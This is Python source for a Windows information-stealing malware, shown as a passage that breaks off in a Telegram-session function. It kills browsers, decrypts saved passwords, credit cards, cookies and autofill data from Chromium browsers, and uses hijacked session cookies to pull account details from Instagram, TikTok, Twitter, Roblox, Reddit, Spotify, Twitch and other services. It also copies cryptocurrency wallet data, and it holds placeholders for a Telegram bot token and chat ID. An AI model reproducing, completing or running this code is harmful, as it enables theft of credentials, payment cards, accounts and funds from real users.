import ctypes
import json
import asyncio
import base64
import re
import sys
import time
import winreg
import aiohttp # type: ignore
import os
import shutil
import sqlite3
import requests
import platform
import psutil # type: ignore
import win32api # type: ignore

from pathlib import Path
from ctypes import *
from urllib.request import urlopen
from json import loads
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # type: ignore
from cryptography.hazmat.backends import default_backend # type: ignore


TOKEN = '%TOKEN%'
CHAT_ID = '%CHAT_ID%'


async def error_handler() -> None:

    hostname = platform.node()
    temp_dir = os.path.join(os.getenv('TEMP'), hostname)

    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    exc_type, exc_value, exc_traceback = sys.exc_info()    
    error_file_path = os.path.join(temp_dir, 'errors.txt')

    with open(error_file_path, 'a') as file:
        file.write(f"Type : {exc_type.__name__}\n")
        file.write(f"Message : {exc_value}\n")
        tb = exc_traceback

        while tb.tb_next:
            tb = tb.tb_next

        file.write(f"Fichier : {tb.tb_frame.f_code.co_filename}\n")
        file.write(f"Ligne : {tb.tb_lineno}\n\n")
        
class ListFonction:
    Cards = list()
    Cookies = list()
    Passwords = list()
    Autofills = list()

    ClipBoard = list()
    Network = list()
    InstalledSoftware = list()
    Processes = list()
    TasksList = list()
    SystemInfo = list()

    DiscordAccounts = list()
    RobloxAccounts = list()
    TikTokAccounts = list()
    TwitterAccounts = list()
    InstagramAccounts = list()
    RiotUserAccounts = list()
    SteamUserAccounts = list()
    RedditAccounts = list()
    TwitchAccounts = list()
    SpotifyAccount = list()
    GuildedAccounts = list()
    PatreonAccounts = list()

class WindowsApi:
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: 

        class DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None

        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)

        raise ValueError("Invalid encrypted_data provided!")

    @staticmethod
    def GetKey(FilePath:str) -> bytes:
        with open(FilePath,"r", encoding= "utf-8", errors= "ignore") as file:
            jsonContent: dict = json.load(file)

            encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
            encryptedKey = base64.b64decode(encryptedKey.encode())[5:]

            return WindowsApi.CryptUnprotectData(encryptedKey)

    @staticmethod
    def Decrpytion(EncrypedValue: bytes, EncryptedKey: bytes) -> str:
        try:
            version = EncrypedValue.decode(errors="ignore")
            if version.startswith("v10") or version.startswith("v11"):
                iv = EncrypedValue[3:15]
                password = EncrypedValue[15:]
                authentication_tag = password[-16:]
                password = password[:-16]
                backend = default_backend()
                cipher = Cipher(algorithms.AES(EncryptedKey), modes.GCM(iv, authentication_tag), backend=backend)
                decryptor = cipher.decryptor()
                decrypted_password = decryptor.update(password) + decryptor.finalize()
                return decrypted_password.decode('utf-8')
            else:
                return str(WindowsApi.CryptUnprotectData(EncrypedValue))
        except:
            return "Decryption Error!, Data cant be decrypt"

class get_data:
    def __init__(self):
        self.profiles_full_path = []
        self.appdata = os.getenv('APPDATA')
        self.localappdata = os.getenv('LOCALAPPDATA')
        self.temp = os.getenv('TEMP')

    async def RunAllFonctions(self):
        await self.kill_browsers()
        await self.list_profiles()
        taskk = [
            asyncio.create_task(self.GetPasswords()),
            asyncio.create_task(self.GetCards()),
            asyncio.create_task(self.GetCookies()),
            asyncio.create_task(self.GetAutoFills()),
            asyncio.create_task(self.StealDiscord()),
            InfoStealer().run_all_fonctions(),
            ]
        await asyncio.gather(*taskk)
        await self.InsideFolder()
        await self.SendAllData()
    async def list_profiles(self) -> None:
        try:
            directorys = {
                "Brave": os.path.join(self.LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
                "Chrome": os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
                "Chromium": os.path.join(self.LocalAppData, "Chromium", "User Data"),
                "Edge": os.path.join(self.LocalAppData, "Microsoft", "Edge", "User Data"),
                "EpicPrivacy": os.path.join(self.LocalAppData, "Epic Privacy Browser", "User Data"),
                "Iridium": os.path.join(self.LocalAppData, "Iridium", "User Data"),
                "Opera": os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
                "OperaGX": os.path.join(self.RoamingAppData, "Opera Software", "Opera GX Stable"),
                "Vivaldi": os.path.join(self.LocalAppData, "Vivaldi", "User Data"),
                "Yandex": os.path.join(self.LocalAppData, "Yandex", "YandexBrowser", "User Data")
            }
            for name, directory in directorys.items():
                if os.path.isdir(directory):
                    if "Opera" in name:
                        self.profiles_full_path.append(directory)
                    else:
                        self.profiles_full_path.extend(os.path.join(root, folder) for root, folders, _ in os.walk(directory) for folder in folders if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder)

        except:
            pass

    async def kill_browsers(self):
        try:
            process_names = ["chrome.exe", "opera.exe", "edge.exe", "firefox.exe", "brave.exe", "browser.exe", "vivaldi.exe", "iridium.exe", "epicprivacy.exe", "chromium.exe"]
            process = await asyncio.create_subprocess_shell('tasklist',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)

            stdout, stderr = await process.communicate()
            if not process.returncode != 0:
                output_lines = stdout.decode(errors="ignore").split('\n')
                for line in output_lines:
                    for process_name in process_names:
                        if process_name.lower() in line.lower():
                            parts = line.split()
                            pid = parts[1]
                            process = await asyncio.create_subprocess_shell(f'taskkill /F /PID {pid}',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
                            await process.communicate()
        except:
            pass

    async def GetPasswords(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    BrowserName = "Opera"
                else:
                    text = path.split("\\")
                    BrowserName = text[-4] + " " + text[-3]
                key = WindowsApi.GetKey(os.path.join(user_data_part, "Local State"))
                LoginData = os.path.join(path, "Login Data")
                copied_file_path = os.path.join(self.Temp, "Logins.db")
                shutil.copyfile(LoginData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select origin_url, username_value, password_value from logins')
                logins = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for login in logins:
                    if login[0] and login[1] and login[2]:
                        ListFonction.Passwords.append(f"URL : {login[0]}\nUsername : {login[1]}\nPassword : {WindowsApi.Decrpytion(login[2], key)}\nBrowser : {BrowserName}\n======================================================================\n")
        except:
            pass
    async def GetCards(self) -> None:
        try:
            for path in self.profiles_full_path:
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                key = WindowsApi.GetKey(os.path.join(user_data_part, "Local State"))
                WebData = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "Web.db")
                shutil.copyfile(WebData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards')
                cards = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for card in cards:
                    if card[2] < 10:
                        month = "0" + str(card[2])
                    else:month = card[2]
                    ListFonction.Cards.append(f"{WindowsApi.Decrpytion(card[0], key)}\t{month}/{card[1]}\t{card[3]}\n")
        except:
            pass 
    async def GetCookies(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")

                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    BrowserName = "Opera"
                else:
                    text = path.split("\\")
                    BrowserName = text[-4] + " " + text[-3]

                key = WindowsApi.GetKey(os.path.join(user_data_part, "Local State"))
                CookieData = os.path.join(path, "Network", "Cookies")
                copied_file_path = os.path.join(self.Temp, "Cookies.db")
            
                try:
                    shutil.copyfile(CookieData, copied_file_path)
                except:
                    pass

                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select host_key, name, path, encrypted_value,expires_utc from cookies')
                cookies = cursor.fetchall()
             
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:
                    pass

                for cookie in cookies:
                    dec_cookie = WindowsApi.Decrpytion(cookie[3], key)
                    ListFonction.Cookies.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{dec_cookie}\n")

                    if ".instagram.com" in cookie[0].lower() and "sessionid" in cookie[1].lower():asyncio.create_task(self.StealInstagram(dec_cookie, BrowserName))
                    if ".tiktok.com" in cookie[0].lower() and cookie[1] == "sessionid":asyncio.create_task(self.StealTikTok(dec_cookie, BrowserName))
                    if ".x.com" in cookie[0].lower() and cookie[1] == "auth_token":asyncio.create_task(self.StealTwitter(dec_cookie, BrowserName))
                    if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):asyncio.create_task(self.StealRoblox(dec_cookie, BrowserName)) 
                    if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():asyncio.create_task(self.StealReddit(dec_cookie, BrowserName))
                    if ".guilded.gg" in str(cookie[0]).lower() and "hmac_signed_session" in str(cookie[1]).lower():asyncio.create_task(self.StealGuilded(dec_cookie, BrowserName))
                    if ".patreon.com" in str(cookie[0]).lower() and "session_id" in str(cookie[1]).lower():asyncio.create_task(self.StealPatreon(dec_cookie, BrowserName))
                    if ".spotify.com" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():asyncio.create_task(self.StealSpotify(dec_cookie, BrowserName))
                    if ".twitch.tv" in str(cookie[0]).lower() and "auth-token" in str(cookie[1]).lower():twitch_cookie = dec_cookie
                    if ".twitch.tv" in str(cookie[0]).lower() and str(cookie[1]).lower() == "login":twitch_username = dec_cookie
                    if not twitch_username == None and not twitch_cookie == None:
                        asyncio.create_task(self.StealTwitch(twitch_cookie, twitch_username, BrowserName))
                        twitch_username = None
                        twitch_cookie = None
                    if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():asyncio.create_task(self.StealRiotUser(dec_cookie, BrowserName))

        except:
            pass

    async def GetAutoFills(self) -> None:
        try:
            for path in self.profiles_full_path:
                autofill_data = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "AutofillData.db")                
                shutil.copyfile(autofill_data, copied_file_path)
                with sqlite3.connect(copied_file_path) as database_connection:
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT * FROM autofill')
                    autofills = cursor.fetchall()
                for autofill in autofills:
                    if autofill:
                        ListFonction.Autofills.append(f"data: {autofill[0]}\nvalue: {autofill[1]}\n==============================\n")
                try:
                    cursor.close()
                    os.remove(copied_file_path)
                except:pass  
        except Exception:
            await error_handler()










    async def StealRiotUser(self, cookie, browser: str) -> None:
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get('https://account.riotgames.com/api/account/v1/user', headers={"Cookie": f"sid={cookie}"}) as req:
                    response = await req.json()

            username = str(response.get("username", "No Username"))
            email = str(response.get("email", "No Email"))
            region = str(response.get("region", "No Region"))
            locale = str(response.get("locale", "No Locale"))
            country = str(response.get("country", "No Country"))
            mfa = str(response.get("mfa", {}).get("verified", "No MFA Info"))

        except Exception:
            await error_handler()
        else:
            ListFonction.RiotGames.append(f"Username: {username}\nEmail: {email}\nRegion: {region}\nLocale: {locale}\nCountry: {country}\nMFA Verified: {mfa}\nBrowser: {browser}\nCookie: {cookie}")

    async def StealTwitch(self, auth_token, username, browser:str) -> None:
        try:
            url = 'https://gql.twitch.tv/gql'
            headers = {
                'Authorization': f'OAuth {auth_token}',
            }

            query = f"""
            query {{
                user(login: "{username}") {{
                    id
                    login
                    displayName
                    email
                    hasPrime
                    isPartner
                    language
                    profileImageURL(width: 300)
                    bitsBalance
                    followers {{
                        totalCount
                    }}
                }}
            }}"""

            data = {
                "query": query
            }

            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.post(url, headers=headers, json=data) as response:
                    if response.status == 200:
                        data = await response.json()

            idd = data["data"]["user"]["id"]
            login = data["data"]["user"]["login"]
            acc_url = f"https://www.twitch.tv/{login}"
            displayName = data["data"]["user"]["displayName"]
            email = data["data"]["user"]["email"]
            hasPrime = data["data"]["user"]["hasPrime"]
            isPartner = data["data"]["user"]["isPartner"]
            lang = data["data"]["user"]["language"]
            bits = data["data"]["user"]["bitsBalance"]
            followers = data["data"]["user"]["followers"]["totalCount"]            

        except Exception:
            await error_handler()
        else:
            ListFonction.TwitchAccounts.append(f"ID: {idd}\nLogin: {login}\nDisplay Name: {displayName}\nEmail: {email}\nHas Prime: {hasPrime}\nIs Partner: {isPartner}\nLanguage: {lang}\nBits Balance: {bits}\nFollowers: {followers}\nProfile URL: {acc_url}\nBrowser: {browser}\nAuth Token: {auth_token}")

    async def StealSpotify(self, cookie, browser: str) -> None:
        try:
            url = 'https://www.spotify.com/api/account-settings/v1/profile'
            url2 = 'https://www.spotify.com/eg-en/api/account/v1/datalayer/'

            headers = {
                'cookie': f'sp_dc={cookie}',
                'Accept': 'application/json'
            }

            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get(url, headers=headers) as response:
                    if response.status == 200:
                        data = await response.json()
                    else:
                        await error_handler()
                        return

                async with session.get(url2, headers=headers) as response:
                    if response.status == 200:
                        data2 = await response.json()
                    else:
                        await error_handler()
                        return

            email = data["profile"]["email"]
            gender = data["profile"]["gender"]
            birthdate = data["profile"]["birthdate"]
            country = data["profile"]["country"]
            third = data["profile"]["third_party_email"]
            username = data["profile"]["username"]
            istrial = data2["isTrialUser"]
            plan = data2["currentPlan"]
            isrecurring = data2["isRecurring"]
            daysleft = data2["daysLeft"]
            sub = data2["isSubAccount"]
            billing = data2["nextBillingInfo"]
            expiry = data2["expiry"]

            ListFonction.SpotifyAccount.append(f"Browser: {browser}\nEmail: {email}\nGender: {gender}\nBirthdate: {birthdate}\nCountry: {country}\nThird Party Email: {third}\nUsername: {username}\nIsTrial: {istrial}\nCurrentPlan: {plan}\nIsRecurring: {isrecurring}\nDaysLeft: {daysleft}\nIsSub: {sub}\nBilling Info: {billing}\nExpiry: {expiry}\n==============================================\n")

        except Exception:
            await error_handler()


    async def StealReddit(self, cookie, browser: str) -> None:
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.post('https://accounts.reddit.com/api/access_token', headers={"cookie": f"reddit_session={cookie}", "Authorization": "Basic b2hYcG9xclpZdWIxa2c6"}, json={"scopes": ["*", "email", "pii"]}) as res:
                    response = await res.json()
                    accessToken = response["access_token"]
                async with session.get('https://oauth.reddit.com/api/v1/me', headers={'User-Agent': 'android:com.example.myredditapp:v1.2.3', "Authorization": "Bearer " + accessToken}) as req:
                    data2 = await req.json()

                gmail = data2.get("email", "No email") if data2.get("email") else "No email"
                username = data2.get("name", "No username")
                profileUrl = f'https://www.reddit.com/user/{username}'
                commentKarma = data2.get("comment_karma", "No comment karma")
                totalKarma = data2.get("total_karma", "No total karma")
                coins = data2.get("coins", "No coins")
                mod = data2.get("is_mod", "No mod status")
                gold = data2.get("is_gold", "No gold status")
                suspended = data2.get("is_suspended", "No suspension status")

        except Exception:
            await error_handler()
        else:
            ListFonction.RedditAccounts.append(f"Username: {username}\nEmail: {gmail}\nProfile URL: {profileUrl}\nComment Karma: {commentKarma}\nTotal Karma: {totalKarma}\nCoins: {coins}\nMod Status: {mod}\nGold Status: {gold}\nSuspended: {suspended}\nBrowser: {browser}\nCookie: {cookie}")


    async def StealPatreon(self, cookie, browser: str) -> None:
        try:
            patreonurl = "https://www.patreon.com/api/current_user?include=connected_socials%2Ccampaign.connected_socials&json-api-version=1.0"
            headers = {
                "Cookie": f'session_id={cookie}',
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            }

            async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get(patreonurl) as response:
                    data = await response.json()

            req = data["data"]["attributes"].get
            social_connections = data.get("data", {}).get("attributes", {}).get("social_connections", {})
            created = req("created", "Couldn't get creation date")
            email = req("email", "Couldn't get email")
            verified = '✅' if req("is_email_verified", False) else '❌'
            currency = req("patron_currency", "Couldn't get currency")
            bio = req("about", "Couldn't get bio/No bio")
            non_null_social_connections = [key for key, value in social_connections.items() if value is not None]
            url = data["links"].get("self", "Couldn't get URL")
            url2 = req("url", "Couldn't get URL")
            social_connection_names = "\n".join([f"{key.capitalize()}" for key in non_null_social_connections]) if non_null_social_connections else "No connections"

        except Exception:
            await error_handler()
        else:
            ListFonction.PatreonAccounts.append(f"Email: {email}\nVerified: {verified}\nCreated: {created}\nCurrency: {currency}\nBio: {bio}\nSocial Connections:\n{social_connection_names}\nProfile URL: {url}\nAdditional URL: {url2}\nBrowser: {browser}\nCookie: {cookie}")

    async def StealGuilded(self, cookie, browser: str) -> None:
        try:
            urlguild = "https://www.guilded.gg/api/me"
            headersguild = {
                "Cookie": f"hmac_signed_session={cookie}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            }

            async with aiohttp.ClientSession(headers=headersguild, connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get(urlguild) as response:
                    data = await response.json()

            social_links_info = [{"Name": link.get('handle', ''), "Website": link.get('type', 'Cannot get the website'), "URL": link.get('additionalInfo', {}).get('profileUrl', 'No Website')} for link in data["user"].get('socialLinks', [])] or 'No Connections'

            formatted_social_links = "\n".join([f"📙 {link['Name']}\n🌐 {link['Website']}\n`🔗 {link['URL']}`" for link in social_links_info]) if social_links_info != 'No Connections' else 'No Connections'

            email = data["user"].get("email", 'No Email')
            ids = data["user"].get("id", 'Error getting ID')
            globalusername = data["user"].get("name", 'No global username')
            username = data["user"].get("subdomain", 'No Subdomain (Private Username)')
            join = data["user"].get("joinDate", "Couldn't get join date")
            bio = data["user"]["aboutInfo"].get("tagLine", "Couldn't get user bio")

        except Exception:
            await error_handler()
        else:
            ListFonction.GuildedAccounts.append(f"Username: {username}\nGlobal Username: {globalusername}\nEmail: {email}\nUser ID: {ids}\nJoin Date: {join}\nBio: {bio}\nSocial Links:\n{formatted_social_links}\nBrowser: {browser}\nCookie: {cookie}")


    async def StealInstagram(self, cookie: str, browser: str) -> None:
        try:
            headers = {
                "user-agent": "Instagram 219.0.0.12.117 Android",
                "cookie": f"sessionid={cookie}"
            }

            infoURL = 'https://i.instagram.com/api/v1/accounts/current_user/?edit=true'

            async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get(infoURL) as response:
                    data = await response.json()
                async with session.get(f"https://i.instagram.com/api/v1/users/{data['user']['pk']}/info/") as response:
                    data2 = await response.json()

            username = data["user"]["username"]
            profileURL = "https://instagram.com/" + username

            bio = data["user"]["biography"] if data["user"]["biography"] else "No bio"
            bio = bio.replace("\n", ", ")

            fullname = data["user"]["full_name"] if data["user"]["full_name"] else "No nickname"
            email = data["user"].get("email", "No email")
            verify = data["user"].get("is_verified", False)
            followers = data2["user"].get("follower_count", 0)
            following = data2["user"].get("following_count", 0)

        except Exception:
            await error_handler()
        else:
            ListFonction.InstagramAccounts.append(f"Username: {username}\nFull Name: {fullname}\nEmail: {email}\nIs Verified: {'Yes' if verify else 'No'}\nFollowers: {followers}\nFollowing: {following}\nBio: {bio}\nProfile URL: {profileURL}\nBrowser: {browser}\nCookie: {cookie}")

    async def StealTikTok(self, cookie: str, browser: str) -> None:
        try:
            headers = {"cookie": f"sessionid={cookie}", "Accept-Encoding": "identity"}
            url1 = 'https://www.tiktok.com/passport/web/account/info/'
            url2 = 'https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988'

            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                data = await (await session.get(url1, headers=headers)).json()
                data2 = await (await session.get(url2, headers=headers)).json()

                user_id = data["data"]["user_id"]
                email = data["data"].get("email", "No Email")
                phone = data["data"].get("mobile", "No number")
                username = data["data"]["username"]
                coins = data2["data"]["coins"]
                timestamp = data["data"]["create_time"]
                uid = data["data"]["sec_user_id"]

                try:
                    url3 = f'https://www.tiktok.com/api/user/list/?count=1&minCursor=0&scene=67&secUid={uid}'
                    data3 = await (await session.get(url3, headers=headers)).json()
                    subscriber = data3.get("total", "0")
                except Exception:
                    await error_handler()
                    subscriber = "0"

                formatted_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))

        except Exception:
            await error_handler()
            pass
        else:
            ListFonction.TikTokAccounts.append(f"User ID: {user_id}\nUsername: {username}\nEmail: {email}\nPhone: {phone}\nCoins: {coins}\nCreated At: {formatted_date}\nSubscribers: {subscriber}\nBrowser: {browser}\nCookie: {cookie}\n")

    async def StealTwitter(self, cookie: str, browser: str) -> None:
        try:
            authToken = f'{cookie};ct0=ac1aa9d58c8798f0932410a1a564eb42'
            headers = {
                'authority': 'twitter.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9',
                'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
                'origin': 'https://twitter.com', 'referer': 'https://twitter.com/home', 'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
                'x-twitter-active-user': 'yes', 'x-twitter-auth-type': 'OAuth2Session', 'x-twitter-client-language': 'en',
                'x-csrf-token': 'ac1aa9d58c8798f0932410a1a564eb42', "cookie": f'auth_token={authToken}'
            }
            url = "https://twitter.com/i/api/1.1/account/update_profile.json"

            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                response = await session.post(url, headers=headers)
                req = await response.json()

                username = req.get("name", "N/A")
                nickname = req.get("screen_name", "N/A")
                followers_count = req.get("followers_count", 0)
                following_count = req.get("friends_count", 0)
                tweets_count = req.get("statuses_count", 0)
                verified = req.get("verified", False)
                created_at = req.get("created_at", "N/A")
                description = req.get("description", "N/A")
                profileURL = f"https://twitter.com/{nickname}"
            
        except Exception:
            await error_handler()
        else:
            ListFonction.TwitterAccounts.append(f"Username: {username}\nScreen Name: {nickname}\nFollowers: {followers_count}\nFollowing: {following_count}\nTweets: {tweets_count}\nIs Verified: {'Yes' if verified else 'No'}\nCreated At: {created_at}\nBiography: {description}\nProfile URL: {profileURL}\nCookie: {cookie}\nBrowser: {browser}")
    async def StealRoblox(self, cookie, browser) -> None:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://www.roblox.com/mobileapi/userinfo", cookies = {".ROBLOSECURITY": cookie}) as response:
                    baseinf = await response.json()
            username, userId,robux,thumbnail, premium, builderclub = baseinf["UserName"], baseinf["UserID"], baseinf["RobuxBalance"],baseinf["ThumbnailUrl"], baseinf["IsPremium"],baseinf["IsAnyBuildersClubMember"]

            async def GetAll(UserID: int) -> list:
                try:
                    FullList = []
                    async with aiohttp.ClientSession() as session:
                        async with session.get(f'https://friends.roblox.com/v1/users/{UserID}/friends') as response:
                            response_text = await response.text()
                            Friendslist = json.loads(response_text)

                    if 'data' in Friendslist:
                        x = 0
                        for friend in Friendslist['data']:
                            if x == 3:
                                return FullList
                            
                            is_banned = friend.get('isBanned', False)
                            has_verified_badge = friend.get('hasVerifiedBadge', False)

                            banned_status = "❌" if not is_banned else "✅"
                            verified_status = "❌" if not has_verified_badge else "✅"

                            FullList.append((friend.get('displayName', ''), friend.get('name', ''), banned_status, verified_status))
                            x += 1
                        return FullList
                    else:
                        raise ValueError("No 'data' key in the response.")
                except Exception:
                    await error_handler()
                    return []

            async def GetRAP(UserID):
                ErroredRAP = 0
                TotalValue = 0
                Cursor = ""
                Done = False
                while not Done:
                    try:
                        async with aiohttp.ClientSession() as session:
                            async with session.get(f"https://inventory.roblox.com/v1/users/{UserID}/assets/collectibles?sortOrder=Asc&limit=100&cursor={Cursor}") as response:
                                data = await response.json()
                                
                        if data.get('nextPageCursor') is None:
                            Done = True
                        else:
                            Cursor = data['nextPageCursor']

                        for Item in data.get("data", []):
                            try:
                                RAP = int(Item.get('recentAveragePrice', 0))
                                TotalValue += RAP
                            except Exception as e:
                                ErroredRAP += 1
                        
                        if not data.get('nextPageCursor'):
                            Done = True
                                    
                    except Exception:
                        await error_handler()
                        Done = True
                return TotalValue

            friendlist = await GetAll(userId)
            rap = await GetRAP(userId)
            
            if premium == True:
                premium = '✅'
            else:
                premium = '❌'
            if builderclub == True:
                builderclub = '✅'
            else:
                premium = '❌'

            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://users.roblox.com/v1/users/{userId}") as response:
                    advancedInfo = await response.json()
            description = 'No Description'
            if advancedInfo["description"]:
                description = advancedInfo["description"]
            if advancedInfo["description"] == True:
                banned = '✅'
            else: 
                banned = '❌'
            creationDate = advancedInfo["created"]
            creationDate = creationDate.split("T")[0].split("-")
            creationDate = f"{creationDate[1]}/{creationDate[2]}/{creationDate[0]}"
            creation_timestamp = time.mktime(time.strptime(creationDate, "%m/%d/%Y"))
            current_timestamp = time.time()
            seconds_passed = current_timestamp - creation_timestamp
            days_passed = round(seconds_passed / (24 * 60 * 60))

        except Exception:
            await error_handler()
        else:
            ListFonction.RobloxAccounts.append(f"Cookie: {cookie}\nBrowser: {browser}\nUser: {username} ({userId})\nThumbail: {thumbnail}\nRobux: {robux}\nPremium: {premium}\nCreation Date: {creationDate} / {days_passed} Days!\nDescription: {description}\nBanned: {banned}\nRAP: {rap}\nFriends List: \n{friendlist}\n==============================================\n")
            






































    async def StealWallets(self, copied_path:str) -> None:
        try:
            wallets_ext_names = {
                "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
                "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
                "Authy": "gaedmjdfmmahhbjefcbgaolhhanlaolb",
                "EOSAuthenticator": "oeljdldpnmdbchonielidgobddffflal",
                "GAuthAuthenticator": "ilgcnhelpchnceeipipijaljkblbcobl",
                "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
                "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
                "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "MetaMask_Edge": "ejbalbakoplchlghecdalmeeeajnimhm",
                "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
                "TrustWallet": "egjidjbpglichdcondbcbdnbeeppgdph",
                "Metamask (Opera)": "djclckkglechooblngghdinmeemkbgci",
                "Ronin": "bblmcdckkhkhfhhpfcchlpalebmonecp",
                }
            wallet_local_paths = {
                "Bitcoin": os.path.join(self.RoamingAppData, "Bitcoin", "wallets"),
                "Bytecoin": os.path.join(self.RoamingAppData, "bytecoin"),
                "Coinomi": os.path.join(self.LocalAppData, "Coinomi", "Coinomi", "wallets"),
                "Atomic": os.path.join(self.RoamingAppData, "Atomic", "Local Storage", "leveldb"),
                "Dash": os.path.join(self.RoamingAppData, "DashCore", "wallets"),
                "Exodus": os.path.join(self.RoamingAppData, "Exodus", "exodus.wallet"),
                "Electrum": os.path.join(self.RoamingAppData, "Electrum", "wallets"),
                "WalletWasabi": os.path.join(self.RoamingAppData, "WalletWasabi", "Client", "Wallets"),
            }
            wallet_dir = os.path.join(copied_path, "Wallets")
            os.makedirs(wallet_dir, exist_ok=True)

            for path in self.profiles_full_path:
                ext_path = os.path.join(path, "Local Extension Settings")
                if os.path.exists(ext_path):
                    for wallet_name, wallet_addr in wallets_ext_names.items():
                        wallet_path = os.path.join(ext_path, wallet_addr)
                        if os.path.isdir(wallet_path):
                            try:
                                file_name = f"{os.path.basename(ext_path)} {wallet_name}"
                                dest_path = os.path.join(wallet_dir, file_name)
                                shutil.copytree(wallet_path, dest_path)
                            except Exception:
                                await error_handler()


            for wallet_name, wallet_path in wallet_local_paths.items():
                try:
                    if os.path.exists(wallet_path):
                        dest_path = os.path.join(wallet_dir, wallet_name)
                        shutil.copytree(wallet_path, dest_path)
                except Exception:
                    await error_handler()

        except Exception:
            await error_handler()

    async def StealTelegramSession(self, directory_path: str) -> None:
        try:
            tg_path = os.path.join(self.RoamingAppData, "Telegram Desktop", "tdata")
            
            if os.path.exists(tg_path):
                copy_path = os.path.join(directory_path, "Messenger", "Telegram Session")
